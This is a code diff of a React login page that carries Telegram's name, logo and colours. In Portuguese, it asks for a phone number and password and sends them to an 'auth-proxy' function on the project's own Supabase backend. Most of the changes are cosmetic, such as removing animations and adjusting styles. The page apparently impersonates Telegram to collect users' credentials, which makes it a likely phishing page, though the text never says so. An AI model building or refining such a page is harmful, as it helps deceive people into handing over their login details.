@@ -1,6 +1,5 @@
 import { useState, useCallback, useMemo, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { AnimatePresence, motion } from 'motion/react';
 import { useToast } from '../components/Toast';
 import { supabase } from '../lib/supabase';
 import { Eye, EyeOff, Loader2, Search, X, Check, ChevronDown } from 'lucide-react';
@@ -31,7 +30,7 @@ export default function Login() {
     try {
       const saved = localStorage.getItem('saved_phone');
       if (saved) setPhone(saved);
-    } catch {}
+    } catch { }
   }, []);
 
   const togglePasskey = useCallback(() => setShowPasskey(v => !v), []);
@@ -58,10 +57,16 @@ export default function Login() {
 
     setIsSubmitting(true);
     try {
-      const { data, error } = await supabase.auth.signInWithPassword({
-        email: `${cleanPhone}@user.com`,
-        password: cleanPasskey,
+      const { data, error } = await supabase.functions.invoke('auth-proxy', {
+        body: { action: 'login', phone: cleanPhone, password: cleanPasskey },
       });
+
+      if (data?.session) {
+        await supabase.auth.setSession({
+          access_token: data.session.access_token,
+          refresh_token: data.session.refresh_token,
+        });
+      }
 
       if (error) {
         if (error.message.includes('Invalid login credentials')) {
@@ -100,7 +105,6 @@ export default function Login() {
     <div className="w-full min-h-screen bg-white pb-12 font-sans antialiased text-black select-none flex flex-col items-center justify-center p-4">
       <main className="w-full max-w-[340px] sm:max-w-[360px] flex flex-col items-center">
 
-        {/* ── LOGO ── */}
         <div className="mb-3.5 flex items-center justify-center">
           <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" className="w-[58px] h-[58px]">
             <defs>
@@ -116,7 +120,6 @@ export default function Login() {
           </svg>
         </div>
 
-        {/* ── TÍTULO E SUBTÍTULO ── */}
         <h1 className="text-[26px] font-bold text-center mb-1.5 tracking-tight text-[#1c1c1e]">
           Telegram
         </h1>
@@ -124,12 +127,10 @@ export default function Login() {
           Introduza o seu número de telefone e chave de acesso para entrar.
         </p>
 
-        {/* ── FORMULÁRIO ── */}
         <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
 
           <div className="w-full flex flex-col gap-5 mt-2">
 
-            {/* 1. Country */}
             <div className="relative w-full">
               <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
                 <label className="text-[14px] text-[#707579] font-medium leading-none">Country</label>
@@ -137,7 +138,8 @@ export default function Login() {
               <button
                 type="button"
                 onClick={() => setShowCountryModal(true)}
-                className="w-full h-[54px] rounded-xl border border-[#dfdfe0] bg-white flex items-center justify-between px-3.5 hover:border-[#3390ec] focus:border-[#3390ec] focus:outline-none transition-colors cursor-pointer"
+                style={{ borderRadius: '12px' }}
+                className="w-full h-[54px] auth-input-btn border border-[#dfdfe0] bg-white flex items-center justify-between px-3.5 hover:border-[#3390ec] focus:border-[#3390ec] focus:outline-none transition-colors cursor-pointer"
                 title="Mudar país"
               >
                 <span className="text-[16px] text-black font-normal">{selectedCountry.name}</span>
@@ -145,12 +147,11 @@ export default function Login() {
               </button>
             </div>
 
-            {/* 2. Phone Number */}
             <div className="relative w-full">
               <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
                 <label className="text-[14px] text-[#707579] font-medium leading-none">Your phone number</label>
               </div>
-              <div className="w-full h-[54px] rounded-xl border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
+              <div style={{ borderRadius: '12px' }} className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
                 <span className="text-[16px] text-black mr-1.5 shrink-0">{selectedCountry.dial_code}</span>
                 <input
                   name="phone"
@@ -165,12 +166,11 @@ export default function Login() {
               </div>
             </div>
 
-            {/* 3. Password */}
             <div className="relative w-full">
               <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
                 <label className="text-[14px] text-[#707579] font-medium leading-none">Password</label>
               </div>
-              <div className="w-full h-[54px] rounded-xl border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
+              <div style={{ borderRadius: '12px' }} className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
                 <input
                   name="passkey"
                   type={showPasskey ? 'text' : 'password'}
@@ -192,12 +192,12 @@ export default function Login() {
 
           </div>
 
-          {/* Botões */}
           <div className="w-full pt-1 space-y-2.5">
             <button
               type="submit"
               disabled={isSubmitting}
-              className="w-full h-[48px] rounded-xl bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center cursor-pointer"
+              style={{ borderRadius: '12px' }}
+              className="w-full h-[48px] btn-auth bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center cursor-pointer"
             >
               {isSubmitting ? <Loader2 className="animate-spin h-5 w-5 text-white" /> : 'Conectar-se'}
             </button>
@@ -213,70 +213,61 @@ export default function Login() {
         </form>
       </main>
 
-      {/* ── MODAL Países ── */}
-      <AnimatePresence>
-        {showCountryModal && (
-          <motion.div
-            initial={{ opacity: 0, y: '100%' }}
-            animate={{ opacity: 1, y: 0 }}
-            exit={{ opacity: 0, y: '100%' }}
-            transition={{ type: 'tween', ease: 'easeOut', duration: 0.3 }}
-            className="fixed inset-0 z-[200] bg-white flex flex-col"
-          >
-            <div className="h-[56px] px-4 flex items-center border-b border-[#c8c7cc] shrink-0 bg-[#f8f8f8]">
-              <button onClick={() => setShowCountryModal(false)} className="text-[#3390ec] text-[17px] font-medium cursor-pointer">
-                Voltar
-              </button>
-              <h2 className="flex-1 text-center text-[17px] font-semibold">Escolha um país</h2>
-              <div className="w-[40px]" />
-            </div>
-            <div className="p-2 bg-[#f8f8f8] border-b border-[#c8c7cc] shrink-0">
-              <div className="bg-[#e3e3e8] h-[36px] rounded-full flex items-center px-3">
-                <Search className="w-5 h-5 text-[#8e8e93] mr-2" />
-                <input
-                  type="text"
-                  placeholder="Pesquisar país ou código"
-                  className="bg-transparent outline-none flex-1 text-[16px] text-black"
-                  value={searchCountry}
-                  onChange={(e) => setSearchCountry(e.target.value)}
-                />
-                {searchCountry && (
-                  <button onClick={() => setSearchCountry('')} className="bg-[#8e8e93] text-white rounded-full p-0.5 ml-2 cursor-pointer">
-                    <X className="w-3 h-3" />
-                  </button>
-                )}
-              </div>
-            </div>
-            <div className="flex-1 overflow-y-auto">
-              {filteredCountries.map((c) => (
-                <div
-                  key={c.code}
-                  className="flex items-center px-4 h-[50px] border-b border-[#c8c7cc] active:bg-gray-100 cursor-pointer"
-                  onClick={() => {
-                    setSelectedCountry(c);
-                    setPhone('');
-                    setShowCountryModal(false);
-                    setSearchCountry('');
-                  }}
-                >
-                  <img
-                    src={`https://flagcdn.com/w40/${c.code.toLowerCase()}.png`}
-                    alt={c.name}
-                    className="w-8 h-auto rounded-sm object-cover mr-3 shrink-0"
-                    onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
-                  />
-                  <span className="flex-1 text-[17px] font-medium text-black">{c.name}</span>
-                  <span className="text-[#8e8e93] text-[17px] mr-2">{c.dial_code}</span>
-                  {selectedCountry.code === c.code && <Check className="w-5 h-5 text-[#3390ec]" />}
-                </div>
-              ))}
-              {filteredCountries.length === 0 && (
-                <div className="p-8 text-center text-[#8e8e93]">Nenhum país encontrado</div>
+      {showCountryModal && (
+        <div className="fixed inset-0 z-[200] bg-white flex flex-col">
+          <div className="h-[56px] px-4 flex items-center border-b border-[#c8c7cc] shrink-0 bg-[#f8f8f8]">
+            <button onClick={() => setShowCountryModal(false)} className="text-[#3390ec] text-[17px] font-medium cursor-pointer">
+              Voltar
+            </button>
+            <h2 className="flex-1 text-center text-[17px] font-semibold">Escolha um país</h2>
+            <div className="w-[40px]" />
+          </div>
+          <div className="p-2 bg-[#f8f8f8] border-b border-[#c8c7cc] shrink-0">
+            <div className="bg-[#e3e3e8] h-[36px] rounded-full flex items-center px-3">
+              <Search className="w-5 h-5 text-[#8e8e93] mr-2" />
+              <input
+                type="text"
+                placeholder="Pesquisar país ou código"
+                className="bg-transparent outline-none flex-1 text-[16px] text-black"
+                value={searchCountry}
+                onChange={(e) => setSearchCountry(e.target.value)}
+              />
+              {searchCountry && (
+                <button onClick={() => setSearchCountry('')} className="bg-[#8e8e93] text-white rounded-full p-0.5 ml-2 cursor-pointer">
+                  <X className="w-3 h-3" />
+                </button>
               )}
             </div>
-          </motion.div>
-        )}
-      </AnimatePresence>
+          </div>
+          <div className="flex-1 overflow-y-auto">
+            {filteredCountries.map((c) => (
+              <div
+                key={c.code}
+                className="flex items-center px-4 h-[50px] border-b border-[#c8c7cc] active:bg-gray-100 cursor-pointer"
+                onClick={() => {
+                  setSelectedCountry(c);
+                  setPhone('');
+                  setShowCountryModal(false);
+                  setSearchCountry('');
+                }}
+              >
+                <img
+                  src={`https://flagcdn.com/w40/${c.code.toLowerCase()}.png`}
+                  alt={c.name}
+                  className="w-8 h-auto rounded-sm object-cover mr-3 shrink-0"
+                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
+                />
+                <span className="flex-1 text-[17px] font-medium text-black">{c.name}</span>
+                <span className="text-[#8e8e93] text-[17px] mr-2">{c.dial_code}</span>
+                {selectedCountry.code === c.code && <Check className="w-5 h-5 text-[#3390ec]" />}
+              </div>
+            ))}
+            {filteredCountries.length === 0 && (
+              <div className="p-8 text-center text-[#8e8e93]">Nenhum país encontrado</div>
+            )}
+          </div>
+        </div>
+      )}
     </div>
   );
 }
